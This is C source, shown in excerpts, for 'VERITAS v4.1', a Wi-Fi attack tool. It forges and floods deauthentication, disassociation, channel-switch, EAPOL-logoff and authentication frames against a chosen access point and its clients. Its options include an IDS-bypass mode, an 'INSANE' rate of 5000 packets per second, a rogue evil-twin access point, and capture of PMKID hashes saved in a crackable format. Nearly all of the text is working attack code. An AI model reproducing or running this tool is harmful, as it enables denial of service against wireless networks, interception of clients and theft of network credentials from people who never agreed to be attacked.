...
typedef enum {
  MODE_STEALTH = 1, MODE_LOW = 2, MODE_MEDIUM = 3,
  MODE_HIGH = 4, MODE_INSANE = 5,
} attack_mode_t;

static const char *MODE_NAMES[] = {"", "STEALTH", "LOW", "MEDIUM", "HIGH", "INSANE"};
...
static void xs64_seed(xorshift64_t *x) {
  ...
  if (fd >= 0) {
    if (read(fd, &x->s, 8) < 8) x->s = (uint64_t)time(NULL) ^ (uint64_t)pthread_self();
    close(fd);
  } else {
...
static int parse_mac(const char *s, uint8_t o[6]) {
  unsigned a[6];
  if (sscanf(s, "%x:%x:%x:%x:%x:%x", &a[0],&a[1],&a[2],&a[3],&a[4],&a[5]) != 6)
    return -1;
  for (int i = 0; i < 6; i++) {
    if (a[i] > 255) return -1;
    o[i] = (uint8_t)a[i];
...
static void format_mac(const uint8_t m[6], char out[MAX_MAC_STR]) {
  snprintf(out, MAX_MAC_STR, "%02x:%02x:%02x:%02x:%02x:%02x",
...
static bool valid_mac(const char *m) {
  ...
  for (int i = 0; i < 17; i++) {
    if ((i+1) % 3 == 0) { if (m[i] != ':' && m[i] != '-') return false; }
...
static void rand_mac(uint8_t o[6]) {
  int fd = open("/dev/urandom", O_RDONLY);
  if (fd >= 0) { if (read(fd, o, 6) < 6) { /* fallback below */ } close(fd); }
  else { for (int i = 0; i < 6; i++) o[i] = (uint8_t)(rand() & 0xFF); }
  o[0] = (o[0] & 0xFE) | 0x02;
}
...
static int mk_csa_beacon(uint8_t *b, const uint8_t bss[6], const char *ssid,
  ...
  b[o++] = 0; b[o++] = (uint8_t)sl;
  memcpy(b + o, ssid, sl); o += sl;
  ...
  c->mode = 1; c->ch = new_ch; c->count = 0;
  o += sizeof(csa_ie_t);
  return o;
}

static int mk_quiet_beacon(uint8_t *b, const uint8_t bss[6],
                            const char *ssid, uint8_t cur_ch) {
  int o = 0;
  o += mk_rt(b + o);
  o += mk_dot11(b + o, FC_BEACON, BCAST, bss, bss, 0);
...
static int mk_eapol_logoff(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6]) {
  int o = 0;
  o += mk_rt(b + o);
  ...
  memset(l->oui, 0, 3); l->type = htons(0x888E);
  o += sizeof(llc_snap_t);

  eapol_t *e = (eapol_t *)(b + o);
  e->ver = 1; e->type = 2; e->len = 0;
  o += sizeof(eapol_t);
  return o;
}
...
static int mk_auth(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6]) {
  ...
  memcpy(b + o, &z, 2); o += 2;     /* auth_algo=0 */
  memcpy(b + o, &one, 2); o += 2;   /* auth_seq=1 */
  memcpy(b + o, &z, 2); o += 2;     /* status=0 */
  return o;
}
...
static bool factory_build(factory_t *f, const target_ap_t *t, int new_ch,
  ...
  f->csa_beacon.len = mk_csa_beacon(f->csa_beacon.buf, bss, t->ssid, cur_ch, (uint8_t)new_ch);
  f->quiet_beacon.len = mk_quiet_beacon(f->quiet_beacon.buf, bss, t->ssid, cur_ch);

  /* [FIX 11] seq=0 at build time (injector assigns real seq) */
  for (int i = 0; i < N_REASONS; i++) {
    f->deauth_fwd[i].len = mk_deauth(f->deauth_fwd[i].buf, bss, cli, REASON_CODES[i], 0);
    f->deauth_rev[i].len = mk_deauth_rev(f->deauth_rev[i].buf, bss, cli, REASON_CODES[i], 0);
  }
  ...
  f->csa_action.len = mk_csa_action(f->csa_action.buf, bss, cli, (uint8_t)new_ch);

  /* [FIX 8] Probe response: unicast to client + broadcast */
  f->probe_resp.len = mk_probe_resp_csa(f->probe_resp.buf, bss, cli, t->ssid, cur_ch, (uint8_t)new_ch);
  f->probe_resp_bc.len = mk_probe_resp_csa(f->probe_resp_bc.buf, bss, BCAST, t->ssid, cur_ch, (uint8_t)new_ch);
...
typedef struct { pkt_t *p[32]; int n; } pkt_set_t;

/* [FIX 3] Explicit empty cases for non-injection vectors */
static pkt_set_t factory_get(factory_t *f, attack_vector_t v) {
  pkt_set_t s = {.n = 0};
  switch (v) {
  case VEC_CSA_BEACON:      s.p[s.n++] = &f->csa_beacon; break;
  case VEC_QUIET_ELEMENT:   s.p[s.n++] = &f->quiet_beacon; break;
  ...
  case VEC_DISASSOC_FLOOD:
    ...
    break;
  case VEC_EAPOL_LOGOFF: s.p[s.n++] = &f->eapol_logoff; break;
  case VEC_CSA_ACTION:   s.p[s.n++] = &f->csa_action; break;
  case VEC_BEACON_CONFUSION: s.p[s.n++] = &f->confusion; break;
  case VEC_PROBE_RESPONSE_CSA:
    s.p[s.n++] = &f->probe_resp;     /* unicast */
    s.p[s.n++] = &f->probe_resp_bc;  /* broadcast */
    break;
  case VEC_DELBA_ATTACK: s.p[s.n++] = &f->delba; break;
  case VEC_AUTH_DOS:
  ...
  case VEC_EVIL_TWIN:      break;  /* rogue AP */
  case VEC_TKIP_MIC:       break;  /* not yet implemented */
  case VEC_POWER_SAVE:     break;  /* not yet implemented */
  case VEC_COUNT:          break;
  }
  return s;
}
...
static void rate_init(rate_ctrl_t *r, attack_mode_t m, int nthreads) {
  ...
  int base_pps;
  switch (m) {
  case MODE_STEALTH: base_pps = 20;   r->base_sleep = 0.5;   break;
  case MODE_LOW:     base_pps = 50;   r->base_sleep = 0.3;   break;
  case MODE_MEDIUM:  base_pps = 200;  r->base_sleep = 0.08;  break;
  case MODE_HIGH:    base_pps = 500;  r->base_sleep = 0.015; break;
  case MODE_INSANE:  base_pps = 5000; r->base_sleep = 0.001; break;
  default:           base_pps = 200;  r->base_sleep = 0.08;  break;
  }
  /* [FIX 19] Divide target by thread count */
  r->target_pps = nthreads > 0 ? base_pps / nthreads : base_pps;
  if (r->target_pps < 1) r->target_pps = 1;
}
...
static double rate_sleep(rate_ctrl_t *r, uint64_t thread_sent) {
  ...
  double current_pps = window_elapsed > 0.01 ? (double)r->window_sent / window_elapsed : 0;
  double ratio = r->target_pps > 0 ? current_pps / r->target_pps : 1.0;

  if (ratio > 1.5) {
    r->factor *= 1.1;
    if (r->factor > 10.0) r->factor = 10.0;
  } else if (ratio < 0.5) {
    r->factor *= 0.9;
    if (r->factor < 0.1) r->factor = 0.1;
  }
  ...
  while (!g_stop) {
    ...
    if (!a->ids_bypass && burst >= 4) {
      ...
      for (int i = 0; i < burst && bcount < BATCH_SIZE; i++) {
        ...
        if (batch[bcount].len > (int)(sizeof(rt_hdr_t) + offsetof(dot11_t, seq) + 2)) {
      ...
      for (int i = 0; i < burst && !g_stop; i++) {
        ...
        if (r > 0) { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
        else atomic_fetch_add(&g_pkts_fail, 1);
...
static void engine_start(engine_t *e) {
  ...
  for (int v = 0; v < VEC_COUNT; v++) {
    if (!e->cfg->vec_on[v]) continue;
    pkt_set_t ps = factory_get(e->fac, (attack_vector_t)v);
    if (ps.n == 0) continue;
    planned++;
    if (e->cfg->dual_radio && e->cfg->iface2[0]) planned++;
  }
  ...
  for (int v = 0; v < VEC_COUNT; v++) {
    ...
    if (e->cfg->dual_radio && e->cfg->iface2[0]) {
      ...
      if (pthread_create(&t2, NULL, inject_thread, a2) == 0) {
        ...
        fprintf(stderr, "  " C_YELLOW "[!] Thread create failed (dual) for %s" RST "\n", VEC_NAMES[v]);
        free(a2);
      }
    }
  }
...
static int set_ch(const char *iface, int ch) {
  ...
  if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
    ...
    if (is_dfs_ch(ch)) {
      fprintf(stderr, "  " C_YELLOW "[!] Channel %d is DFS — may require CAC" RST "\n", ch);
    }
    if (ch >= 149 && ch <= 165) {
      fprintf(stderr, "  " C_YELLOW "[!] Channel %d may be blocked by regulatory domain (check: iw reg get)" RST "\n", ch);
    }
    return -1;
  }
  return 0;
...
static void *capture_thread(void *arg) {
  ...
  if (a->target_bssid[0]) parse_mac(a->target_bssid, target_bss);

  uint8_t buf[4096];
  while (!g_stop) {
    ssize_t n = recv(sock, buf, sizeof(buf), 0);
    if (n <= 40 || !a->active) continue;

    for (ssize_t i = 0; i < n - 5; i++) {
      if (buf[i] != 0x88 || buf[i+1] != 0x8E) continue;
      ...
      if (eapol_start + 4 + 2 < n) {
        /* Key Info is at EAPOL body offset +1 (version=1 byte, type=1, len=2, then key_type=1, key_info=2) */
        /* Actually: EAPOL header is ver(1)+type(1)+len(2) = 4 bytes
           Then Key descriptor: type(1) + key_info(2) */
        ssize_t key_info_off = eapol_start + 4 + 1; /* past EAPOL hdr + descriptor type */
        if (key_info_off + 2 <= n) {
          uint16_t key_info;
          ...
          if (!(key_info & 0x0080)) break; /* no ACK → not M1 */
          if (key_info & 0x0100) break;    /* MIC set → M2/M3/M4 */
        }
      }

      /* [FIX 2] Search for PMKID KDE: DD 14 00 0F AC 04 <16 bytes> */
      for (ssize_t j = i; j < n - 22; j++) {
        if (buf[j] == 0xDD && buf[j+1] == 0x14 &&
            buf[j+2] == 0x00 && buf[j+3] == 0x0F &&
            buf[j+4] == 0xAC && buf[j+5] == 0x04) { /* [FIX 2] check KDE type */

          char pmkid_hex[33];
          for (int k = 0; k < 16 && j+6+k < n; k++) /* [FIX 2] read from j+6 */
          ...
          snprintf(ap_mac_clean, 13, "%02x%02x%02x%02x%02x%02x",
                   d->a3[0],d->a3[1],d->a3[2],d->a3[3],d->a3[4],d->a3[5]);
          snprintf(cli_mac_clean, 13, "%02x%02x%02x%02x%02x%02x",
                   d->a1[0],d->a1[1],d->a1[2],d->a1[3],d->a1[4],d->a1[5]);
          ssid_to_hex(a->target_ssid, ssid_hex, sizeof(ssid_hex));

          char fname[128];
          time_t now = time(NULL);
          struct tm *tm = localtime(&now);
          snprintf(fname, sizeof(fname), "/tmp/veritas_pmkid_%04d%02d%02d.22000",
                   tm->tm_year+1900, tm->tm_mon+1, tm->tm_mday);
          FILE *fp = fopen(fname, "a");
          if (fp) {
            fprintf(fp, "WPA*01*%s*%s*%s*%s\n",
                    pmkid_hex, ap_mac_clean, cli_mac_clean, ssid_hex);
            fclose(fp);
          }
...
static void start_rogue(const config_t *c, const target_ap_t *t) {
  if (!c->spawn_rogue) return;
  char ssid[40];
  if (c->rogue_ssid[0]) snprintf(ssid, sizeof(ssid), "%s", c->rogue_ssid);
  else snprintf(ssid, sizeof(ssid), "%s_5G", t->ssid);
  ...
  snprintf(cmd_type, sizeof(cmd_type), "iw dev %s set type __ap 2>/dev/null", ifc);
  snprintf(cmd_up, sizeof(cmd_up), "ip link set %s up 2>/dev/null", ifc);
  system(cmd_down); system(cmd_type); system(cmd_up);
...
static void stop_rogue(const char *iface2) {
  if (g_rogue > 0) {
    ...
    if (iface2 && iface2[0]) {
      ...
      system(cmd);
      snprintf(cmd, sizeof(cmd), "iw dev %s set type monitor 2>/dev/null", iface2);
      system(cmd);
...
static void *display_thread(void *arg) {
  ...
  while (!g_stop) {
    ...
    printf("  " C_DEEP_B "╔══════════════════════════════════════════════╗" RST "\n");
    printf("  ║" C_ICE BLD "     VERITAS v4.1 — ACTIVE SESSION          " RST C_DEEP_B "║" RST "\n");
    printf("  " C_DEEP_B "╠══════════════════════════════════════════════╣" RST "\n");
    ...
    printf("  ║ " C_GRAY "CH  " RST C_RED "%d" RST " → " C_GREEN "%d" RST
           "  " C_GRAY "MODE" RST " " C_CYAN "%s" RST "%s               ║\033[K\n",
    ...
    char pps_str[32];
    if (pps >= 1000) snprintf(pps_str, sizeof(pps_str), "%.1fK pps", pps/1000);
    else snprintf(pps_str, sizeof(pps_str), "%.0f pps", pps);
    ...
    for (int v = 0; v < VEC_COUNT && vline < th - 16; v++) {
      if (!d->cfg->vec_on[v]) continue;
      printf("  ║ " C_GREEN "▸" RST " %-42s║\033[K\n", VEC_NAMES[v]);
      vline++;
    }
    printf("  " C_DEEP_B "╚══════════════════════════════════════════════╝" RST "\n");
    printf("  " C_DIM_GRAY "[" C_RED "Ctrl+C" RST C_DIM_GRAY "]" RST " stop   "
           C_GRAY "TX:" RST C_AQUA "%lu" RST "  " C_GRAY "%s" RST "  " C_GRAY "%.0f%%" RST "\n",
    ...
    if (d->stats[0] && (now - last_stats_write) >= 1.0) {
      ...
      if (fp) {
        fprintf(fp, "{\"ts\":%.1f,\"elapsed\":%.1f,\"sent\":%lu,\"fail\":%lu,"
                "\"pps\":%.1f,\"tx_ok\":%.1f,\"bssid\":\"%s\",\"ssid\":\"%s\","
                "\"ch\":%d,\"mode\":\"%s\"}\n",
                (double)time(NULL), elapsed, (unsigned long)sent,
                (unsigned long)fail, pps, sc,
                d->tgt->bssid, d->tgt->ssid, d->tgt->channel,
                MODE_NAMES[d->cfg->mode]);
        fclose(fp);
      }
    }
...
static pthread_t start_display(config_t *c, target_ap_t *t, double rate, const char *sf) {
  disp_arg_t *a = calloc(1, sizeof(*a));
  a->cfg = c; a->tgt = t;
  a->refresh = rate > 0.05 ? rate : 0.1;
  if (sf) snprintf(a->stats, MAX_PATH_LEN, "%s", sf);
  pthread_t th; pthread_create(&th, NULL, display_thread, a);
  return th;
}
...
static int detect_mon_ifaces(char out[][MAX_IFACE], int max) {
  ...
  while (fgets(line, sizeof(line), fp) && n < max) {
    ...
    while (*p == ' ' || *p == '\t') p++;
    char *nl = strchr(p, '\n'); if (nl) *nl = 0;
    if (strncmp(p, "Interface ", 10) == 0) snprintf(cur, MAX_IFACE, "%s", p+10);
    else if (strncmp(p, "type ", 5) == 0 && cur[0]) {
      if (strcmp(p+5, "monitor") == 0) snprintf(out[n++], MAX_IFACE, "%s", cur);
      cur[0] = 0;
    }
  }
  pclose(fp);
...
static int scan_aps(const char *iface, int dur, target_ap_t *aps, int max,
                    const char *band) {
  int cnt = 0;
  char tmpdir[128]; snprintf(tmpdir, sizeof(tmpdir), "/tmp/vrt_scan_XXXXXX");
  if (!mkdtemp(tmpdir)) return 0;
  char pfx[200]; snprintf(pfx, sizeof(pfx), "%s/s", tmpdir);
  ...
  if (pid == 0) {
    ...
    if (band && band[0])
      ...
      execlp("airodump-ng","airodump-ng",iface,"-w",pfx,
             "--output-format","csv","--write-interval","1",NULL);
    _exit(1);
  }
  if (pid < 0) return 0;
  ...
  for (int i = 0; i < dur && !g_stop; i++) {
    ...
    printf("\r  " C_GRAY "[" RST);
    for (int j = 0; j < bw; j++) printf(j < fl ? C_BLUE "█" RST : C_DIM_GRAY "░" RST);
  ...
  char csv[220]; snprintf(csv, sizeof(csv), "%s-01.csv", pfx);
  FILE *fp = fopen(csv, "r");
  if (!fp) goto cleanup;

  char line[1024]; bool in_ap = false;
  while (fgets(line, sizeof(line), fp) && cnt < max) {
    char *nl = strchr(line, '\n'); if (nl) *nl = 0;
    if (!line[0]) continue;
    if (strncmp(line, "BSSID", 5) == 0) { in_ap = true; continue; }
    if (strncmp(line, "Station", 7) == 0) break;
    if (!in_ap) continue;

    char fld[20][128]; int nf = 0;
    char *t = line;
    while (nf < 20) {
      char *c = strchr(t, ',');
      int l = c ? (int)(c-t) : (int)strlen(t);
      if (l > 127) l = 127;
      memcpy(fld[nf], t, l); fld[nf][l] = 0;
      char *s = fld[nf]; while (*s == ' ') memmove(s, s+1, strlen(s));
      char *e = s + strlen(s) - 1; while (e > s && *e == ' ') *e-- = 0;
      nf++;
      if (!c) break;
      t = c + 1;
    }
    if (nf < 11 || !valid_mac(fld[0])) continue;

    /* [FIX 35] Only use fld[13] when nf >= 14 */
    char *essid = "";
    if (nf >= 14) essid = fld[13];
    if (!essid[0]) continue;

    snprintf(aps[cnt].bssid, MAX_MAC_STR, "%s", fld[0]);
    snprintf(aps[cnt].ssid, MAX_SSID_LEN+1, "%s", essid);
    aps[cnt].channel = nf > 3 ? atoi(fld[3]) : 1;
    if (aps[cnt].channel < 1) aps[cnt].channel = 1;
    aps[cnt].power = nf > 8 ? atoi(fld[8]) : -100;
    if (nf > 5) snprintf(aps[cnt].encryption, 16, "%s", fld[5]);
    cnt++;
  }
  fclose(fp);
  ...
  for (int i = 0; i < cnt-1; i++)
    for (int j = i+1; j < cnt; j++)
      if (aps[j].power > aps[i].power) {
        target_ap_t tmp = aps[i]; aps[i] = aps[j]; aps[j] = tmp;
      }

cleanup:
  { char pat[220]; snprintf(pat, sizeof(pat), "%s*", pfx);
    glob_t g; if (glob(pat,0,NULL,&g)==0) {
      for (size_t i = 0; i < g.gl_pathc; i++) remove(g.gl_pathv[i]);
      globfree(&g); } rmdir(tmpdir); }
  return cnt;
}
...
static bool preflight(void) {
  ...
  struct { const char *name; bool crit; } tools[] = {
    {"iw", true}, {"airodump-ng", false}, {"hostapd", false},
  };
  bool ok = true;
  if (getuid() != 0) { printf("  " C_RED "[✗] ROOT" RST " ... FAIL\n"); return false; }
  printf("  " C_GREEN "[✓]" RST " ROOT        ... OK\n");

  for (int i = 0; i < 3; i++) {
    char cmd[128]; snprintf(cmd, sizeof(cmd), "which %s >/dev/null 2>&1", tools[i].name);
    bool found = system(cmd) == 0;
    char upper[32]; snprintf(upper, sizeof(upper), "%s", tools[i].name);
    for (char *p = upper; *p; p++) *p = toupper(*p);
    if (found) printf("  " C_GREEN "[✓]" RST " %-11s ... OK\n", upper);
    else {
      printf("  %s[%s]" RST " %-11s ... %s\n",
             tools[i].crit ? C_RED : C_YELLOW, tools[i].crit ? "✗" : "⚠",
             upper, tools[i].crit ? "FAIL" : "WARN");
      if (tools[i].crit) ok = false;
    }
  }
  printf("\n");
  return ok;
...
static void input_prompt(const char *prompt, char *out, int sz,
                         bool (*vf)(const char *), const char *err, const char *def) {
  while (1) {
    printf("  " C_ELECTRIC "▸" RST " " C_CYAN "%s" RST, prompt);
    if (def && def[0]) printf(" " C_GRAY "[%s]" RST, def);
    printf(": "); fflush(stdout);
    char buf[256];
    if (!fgets(buf, sizeof(buf), stdin)) exit(0);
    char *nl = strchr(buf, '\n'); if (nl) *nl = 0;
    char *p = buf; while (*p == ' ') p++;
    if (!*p && def && def[0]) p = (char*)def;
    if (!*p || (vf && !vf(p))) { printf("     " C_RED "✗ %s" RST "\n", err); continue; }
    snprintf(out, sz, "%s", p);
    return;
  }
}
...
static void menu_iface(char *out, int sz) {
  ...
  char ifs[16][MAX_IFACE]; int n = detect_mon_ifaces(ifs, 16);
  if (n == 0) { input_prompt("Monitor interface", out, sz, NULL, "Required", ""); return; }
  for (int i = 0; i < n; i++) printf("  " C_CYAN "%d" RST ". %s\n", i+1, ifs[i]);
  printf("\n");
  if (n == 1) { snprintf(out, sz, "%s", ifs[0]); printf("  Auto: %s\n\n", ifs[0]); return; }
  while (1) {
    char buf[16]; printf("  Select [1-%d]: ", n); fflush(stdout);
    if (!fgets(buf,sizeof(buf),stdin)) exit(0);
    int s = atoi(buf); if (s >= 1 && s <= n) { snprintf(out, sz, "%s", ifs[s-1]); return; }
  }
}
...
static void menu_target(const char *iface, target_ap_t *t) {
  ...
  char buf[32]; printf("  Scan APs? " C_AQUA "(Y/n)" RST ": "); fflush(stdout);
  if (!fgets(buf,sizeof(buf),stdin)) exit(0);

  target_ap_t aps[MAX_APS]; int n = 0;
  if (buf[0] != 'n' && buf[0] != 'N') {
    /* [FIX 42] Ask for band */
    char band[8] = "abg";
    ...
    if (fgets(bbuf, sizeof(bbuf), stdin)) {
      char *nl = strchr(bbuf, '\n'); if (nl) *nl = 0;
      char *p = bbuf; while (*p == ' ') p++;
      if (*p) snprintf(band, sizeof(band), "%s", p);
    }
  ...
  printf("  " C_DIM_GRAY "────────────────────────────────────────────────────────" RST "\n");
  for (int i = 0; i < show; i++) {
    const char *pc = abs(aps[i].power)<50 ? C_GREEN : (abs(aps[i].power)<70 ? C_YELLOW : C_RED);
    printf("  " C_CYAN "%2d" RST "  %-18s %3d  %s%4d" RST "  %-9s %s\n",
           i+1, aps[i].bssid, aps[i].channel, pc, aps[i].power, aps[i].encryption, aps[i].ssid);
  }
  printf("   0 = Manual\n\n");

  while (1) {
    printf("  Select [0-%d]: ", show); fflush(stdout);
    if (!fgets(buf,sizeof(buf),stdin)) exit(0);
    int s = atoi(buf);
    if (s == 0) { menu_target(iface, t); return; }
    if (s >= 1 && s <= show) { *t = aps[s-1]; return; }
  }
}

static void menu_vectors(config_t *c) {
  printf("\n  " C_CYAN BLD "Vector Selection" RST "\n\n");
  for (int i = 0; i < VEC_COUNT; i++) printf("  " C_CYAN "%2d" RST ". %s\n", i+1, VEC_NAMES[i]);
  printf("   " C_AQUA "A" RST " = ALL\n\n");
  while (1) {
    char buf[128]; printf("  Select [1,3,7 or 1-5 or A]: "); fflush(stdout);
    if (!fgets(buf,sizeof(buf),stdin)) exit(0);
    char *p = buf; while (*p==' ') p++;
    char *nl = strchr(p,'\n'); if (nl) *nl = 0;
    if (*p == 'A' || *p == 'a') {
      for (int i = 0; i < VEC_COUNT; i++) c->vec_on[i] = true;
      c->nvec = VEC_COUNT; return;
    }
    bool sel[VEC_COUNT] = {0}; bool ok = false;
    char *tk = strtok(p, ",");
    while (tk) {
      while (*tk==' ') tk++;
      char *d = strchr(tk, '-');
      if (d) { *d = 0; int a = atoi(tk), b = atoi(d+1);
        for (int x = a; x <= b; x++) if (x>=1 && x<=VEC_COUNT) { sel[x-1]=true; ok=true; }
      } else { int x = atoi(tk); if (x>=1 && x<=VEC_COUNT) { sel[x-1]=true; ok=true; } }
      tk = strtok(NULL, ",");
    }
    if (ok) {
      int cnt = 0;
      for (int i = 0; i < VEC_COUNT; i++) { c->vec_on[i] = sel[i]; if (sel[i]) cnt++; }
      c->nvec = cnt; return;
    }
  }
}
...
static attack_mode_t menu_mode(void) {
  ...
  struct { int n; const char *nm; const char *c; const char *d; } m[] = {
  ...
  printf("\n");
  while (1) {
    char buf[16]; printf("  Level [1-5] " C_GRAY "[3]" RST ": "); fflush(stdout);
    if (!fgets(buf,sizeof(buf),stdin)) exit(0);
    char *p = buf; while (*p==' ') p++;
    if (*p == '\n' || !*p) return MODE_MEDIUM;
    int s = atoi(p); if (s >= 1 && s <= 5) return (attack_mode_t)s;
  }
}
...
static bool jstr(const char *j, const char *k, char *o, int sz) {
  ...
  const char *p = strstr(j,s); if (!p) return false;
  p += strlen(s); while (*p && (*p==' '||*p==':'||*p=='\t')) p++;
  if (*p != '"') return false;
  p++;
  int i = 0; while (*p && *p != '"' && i < sz-1) { if (*p=='\\' && *(p+1)) p++; o[i++] = *p++; }
  o[i] = 0; return true;
}
...
static bool jbool(const char *j, const char *k, bool *o) {
  ...
  const char *p = strstr(j,s); if (!p) return false;
  p += strlen(s); while (*p && (*p==' '||*p==':'||*p=='\t')) p++;
  if (strncmp(p, "true", 4) == 0) { *o = true; return true; }
  if (strncmp(p, "false", 5) == 0) { *o = false; return true; }
  /* Also accept 1/0 */
  if (*p == '1') { *o = true; return true; }
  if (*p == '0') { *o = false; return true; }
  return false;
}
...
static int jarr(const char *j, const char *k, char o[][64], int mx) {
  ...
  while (*p && *p != ']' && n < mx) {
    ...
    if (*p != '"') break;
    p++;
    int i = 0; while (*p && *p != '"' && i < 63) o[n][i++] = *p++;
    o[n][i] = 0; if (*p == '"') p++; n++;
  }
  return n;
}
...
static void run_script(const char *path) {
  ...
  if (!fp) { printf(C_RED "[!] Cannot open: %s" RST "\n", path); exit(1); }
  fseek(fp, 0, SEEK_END); long sz = ftell(fp); fseek(fp, 0, SEEK_SET);
  char *j = malloc(sz+1);
  if (!j) { fclose(fp); exit(1); }
  size_t nread = fread(j, 1, sz, fp); j[nread] = 0; fclose(fp);

  config_t cfg = {0}; cfg.mode = MODE_MEDIUM; cfg.new_ch = 1;
  strcpy(cfg.client, "ff:ff:ff:ff:ff:ff"); cfg.refresh_rate = 0.1;
  target_ap_t tgt = {0};
  ...
  jint(j, "target_channel", &tgt.channel); if (!tgt.channel) tgt.channel = 6;
  ...
  if (tgt.bssid[0] && !valid_mac(tgt.bssid)) {
    printf(C_RED "[!] Invalid target_bssid: '%s'" RST "\n", tgt.bssid); free(j); exit(1);
  }
  if (cfg.client[0] && strcmp(cfg.client, "ff:ff:ff:ff:ff:ff") != 0 && !valid_mac(cfg.client)) {
    printf(C_RED "[!] Invalid client_mac: '%s'" RST "\n", cfg.client); free(j); exit(1);
  }
  if (!valid_ch(cfg.new_ch)) {
    printf(C_RED "[!] Invalid new_channel: %d" RST "\n", cfg.new_ch); free(j); exit(1);
  }

  char vn[VEC_COUNT][64]; int nv = jarr(j, "vectors", vn, VEC_COUNT);
  for (int i = 0; i < nv; i++)
    for (int v = 0; v < VEC_COUNT; v++)
      if (strcmp(vn[i], VEC_NAMES[v]) == 0) { cfg.vec_on[v] = true; cfg.nvec++; }
  if (!cfg.nvec) { cfg.vec_on[0] = true; cfg.nvec = 1; }

  char ms[32];
  if (jstr(j, "mode", ms, sizeof(ms))) {
    for (char *p = ms; *p; p++) *p = toupper(*p);
    for (int i = 1; i <= 5; i++) if (strcmp(ms, MODE_NAMES[i]) == 0) cfg.mode = (attack_mode_t)i;
  }
  free(j);
  ...
  if (is_dfs_ch(cfg.new_ch))
    printf("  " C_YELLOW "[DFS] Redirect to DFS ch %d — extended DoS via CAC delay" RST "\n", cfg.new_ch);

  set_ch(cfg.iface, tgt.channel);
  usleep_precise(0.3);

  factory_t fac;
  if (!factory_build(&fac, &tgt, cfg.new_ch, cfg.client)) exit(1);
  engine_t eng; engine_init(&eng, &cfg, &fac);
  ...
  if (cfg.duration > 0) {
    ...
    while (!g_stop && mono_time() < end) usleep_precise(0.5);
    g_stop = 1;
  } else { while (!g_stop) usleep_precise(0.5); }

  engine_stop(&eng);
  pthread_join(ch_t, NULL); pthread_join(cap_t, NULL); pthread_join(dsp_t, NULL);
...
static void print_help(void) {
  printf("%s\n", BANNER);
  printf("Usage:\n");
  printf("  sudo ./veritas                     Interactive mode\n");
  ...
  printf("  interface, target_bssid, target_ssid, target_channel, new_channel,\n");
  printf("  client_mac, duration, mode, vectors[], refresh_rate, stats_file,\n");
  printf("  log_pmkid (bool), ids_bypass (bool), dual_radio (bool),\n");
  printf("  iface2, spawn_rogue (bool), rogue_ssid\n\n");
}
...
int main(int argc, char **argv) {
  ...
  if (getuid() != 0) { printf(C_RED "[!] Run as root" RST "\n"); return 1; }
  ...
  for (int i = 1; i < argc; i++) {
    if (strcmp(argv[i], "--pmkid") == 0) cli_pmkid = true;
    else if (strcmp(argv[i], "--ids-bypass") == 0) cli_bypass = true;
    else if (strcmp(argv[i], "--rogue") == 0) cli_rogue = true;
  ...
  printf("\n  Target: " C_ICE "%s" RST " (%s) ch %d\n", tgt.bssid, tgt.ssid, tgt.channel);

  char dch[16]; snprintf(dch, sizeof(dch), "%d", tgt.channel < 14 ? tgt.channel+1 : 1);
  char ncs[16]; input_prompt("Redirect channel", ncs, sizeof(ncs), vch, "Invalid (1-14/36-165)", dch);
  int new_ch = atoi(ncs);

  /* [FIX 46] DFS redirect info */
  if (is_dfs_ch(new_ch))
    printf("  " C_YELLOW "[DFS] Channel %d is DFS — clients must wait for CAC (~60s) to use it" RST "\n", new_ch);

  printf("\n  1. Broadcast (all clients)\n  2. Specific MAC\n\n");
  char buf[32]; printf("  Client [1-2] " C_GRAY "[1]" RST ": "); fflush(stdout);
  if (!fgets(buf,sizeof(buf),stdin)) exit(0);
  char cli[MAX_MAC_STR] = "ff:ff:ff:ff:ff:ff";
  if (buf[0] == '2') input_prompt("Client MAC", cli, sizeof(cli), vmc, "Invalid MAC", "");

  snprintf(cfg.iface, MAX_IFACE, "%s", iface);
  cfg.new_ch = new_ch;
  snprintf(cfg.client, MAX_MAC_STR, "%s", cli);
  cfg.log_pmkid = cli_pmkid;   /* [FIX 26] */
  cfg.ids_bypass = cli_bypass;  /* [FIX 26] */
  cfg.spawn_rogue = cli_rogue;  /* [FIX 26] */
  if (cli_stats) snprintf(cfg.stats_file, MAX_PATH_LEN, "%s", cli_stats);
  ...
  printf("  Client: %-12s  Mode: %s  Vec: %d\n", cli, MODE_NAMES[cfg.mode], cfg.nvec);
  if (cfg.log_pmkid) printf("  " C_GREEN "[PMKID]" RST " capture enabled\n");
  if (cfg.ids_bypass) printf("  " C_YELLOW "[IDS]" RST " bypass enabled\n");
  if (cfg.dual_radio) printf("  " C_CYAN "[DUAL]" RST " %s\n", cfg.iface2);
  if (cfg.spawn_rogue) printf("  " C_ORANGE "[ROGUE]" RST " AP enabled\n");
  printf("  " C_DEEP_B "══════════════════════════════════════" RST "\n");

  printf("\n  " C_RED BLD "Deploy?" RST " (y/N): "); fflush(stdout);
  if (!fgets(buf,sizeof(buf),stdin) || buf[0] != 'y') { printf("  Cancelled.\n"); return 0; }
  ...
  factory_t fac;
  if (!factory_build(&fac, &tgt, new_ch, cli)) return 1; /* [FIX 10] */
  engine_t eng; engine_init(&eng, &cfg, &fac);
  start_rogue(&cfg, &tgt);
  ...
  while (!g_stop) usleep_precise(0.5);
